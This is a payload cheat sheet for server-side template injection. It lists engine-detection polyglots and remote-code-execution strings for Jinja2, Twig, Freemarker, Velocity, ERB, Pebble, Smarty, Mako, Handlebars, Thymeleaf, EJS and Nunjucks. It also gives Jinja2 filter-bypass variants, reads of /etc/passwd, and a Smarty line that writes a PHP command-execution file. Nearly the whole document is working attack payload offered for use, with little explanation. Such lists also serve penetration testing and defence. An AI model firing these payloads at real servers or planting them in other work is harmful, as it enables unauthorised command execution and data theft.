## ============================================================
## SSTI Payloads — Server-Side Template Injection
## ============================================================

## ---- DETECTION POLYGLOTS ----
## Inject these to identify the engine by observing output
${{<%[%'"}}%\.
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
${"freemarker"}
{{7*'7'}}
*{7*7}
@(1+1)
{{ ''.__class__ }}

## If 49 appears → template engine evaluated the expression
## {{7*7}} = 49 → Jinja2, Twig, Nunjucks, or similar
## ${7*7} = 49 → Freemarker, Velocity, Mako, Thymeleaf
## <%= 7*7 %> = 49 → ERB (Ruby), EJS (Node.js)
## #{7*7} = 49 → Slim, Pebble
## {{7*'7'}} = 7777777 → Jinja2; = 49 → Twig

## ---- JINJA2 (Python / Flask / Django) ----
# Read config
{{ config }}
{{ config.items() }}
{{ request.environ }}
{{ self.__init__.__globals__.__builtins__ }}

# RCE via class traversal
{{ ''.__class__.__mro__[1].__subclasses__() }}
{{ ''.__class__.__base__.__subclasses__() }}
# Find os._wrap_close (usually index ~130+)
{{ ''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['popen']('id').read() }}

# Common working payloads
{{ lipsum.__globals__["os"].popen("id").read() }}
{{ cycler.__init__.__globals__.os.popen("id").read() }}
{{ joiner.__init__.__globals__.os.popen("id").read() }}
{{ namespace.__init__.__globals__.os.popen("id").read() }}
{{ request.__class__.__mro__[1].__subclasses__() }}

# Bypass filters (no underscores)
{{ lipsum|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("os")|attr("popen")("id")|attr("read")() }}
{{ ()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')() }}

# Bypass filters (no dots)
{{ lipsum['__globals__']['os']['popen']('id')['read']() }}

# Bypass filters (no quotes)
{% set cmd = request.args.cmd %}{{ lipsum.__globals__["os"].popen(cmd).read() }}

## ---- TWIG (PHP / Symfony) ----
# Version detection
{{_self.env.display("id")}}

# RCE (Twig < 1.x)
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# RCE (Twig 1.x)
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}

# Twig 3.x
{{['id']|filter('system')}}
{{['cat /etc/passwd']|filter('system')}}
{{'id'|filter('system')}}
{{['id']|map('system')}}
{{['id']|sort('system')}}
{{['id']|reduce('system')}}

## ---- FREEMARKER (Java) ----
# Basic info
${.version}
${.data_model}

# RCE via Execute
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# RCE via ObjectConstructor
<#assign ex="freemarker.template.utility.ObjectConstructor"?new()>${ex("java.lang.ProcessBuilder",["id"]).start()}

# RCE via JythonRuntime
<#assign ex="freemarker.template.utility.JythonRuntime"?new()><@ex>import os;os.system("id")</@ex>

# Read file
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve("/etc/passwd").toURL().openStream().readAllBytes()?join(" ")}

## ---- VELOCITY (Java) ----
#set($x='')##
#set($rt=$x.class.forName('java.lang.Runtime'))##
#set($chr=$x.class.forName('java.lang.Character'))##
#set($str=$x.class.forName('java.lang.String'))##
#set($ex=$rt.getRuntime())##
$ex.exec('id')

# Shorter
#set($e="e")
$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")

## ---- ERB (Ruby on Rails) ----
<%= system("id") %>
<%= `id` %>
<%= IO.popen("id").read %>
<%= exec("id") %>
<%= %x(id) %>
<%= File.read("/etc/passwd") %>

## ---- PEBBLE (Java) ----
{% set cmd = 'id' %}
{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}
{{ (1).TYPE.forName('java.lang.String').constructors[0].newInstance(bytes, 0, bytes.length) }}

## ---- SMARTY (PHP) ----
{system('id')}
{php}system('id');{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system('id'); ?>",self::clearConfig())}

## ---- MAKO (Python) ----
<%import os%>${os.popen("id").read()}
<%import os; os.system("id")%>
${self.module.cache.util.os.popen("id").read()}

## ---- HANDLEBARS (Node.js) ----
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id')"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}

## ---- THYMELEAF (Java / Spring) ----
# URL-based (in path/parameter)
__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).useDelimiter('\\A').next()}__::.x

# Fragment expression
${T(java.lang.Runtime).getRuntime().exec('id')}

# SpEL injection via Thymeleaf
*{T(java.lang.Runtime).getRuntime().exec('calc.exe')}
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}

## ---- EJS (Node.js) ----
<%= process.mainModule.require('child_process').execSync('id').toString() %>
<%= global.process.mainModule.require('child_process').execSync('id') %>

## ---- NUNJUCKS (Node.js) ----
{{range.constructor("return global.process.mainModule.require('child_process').execSync('id').toString()")()}}
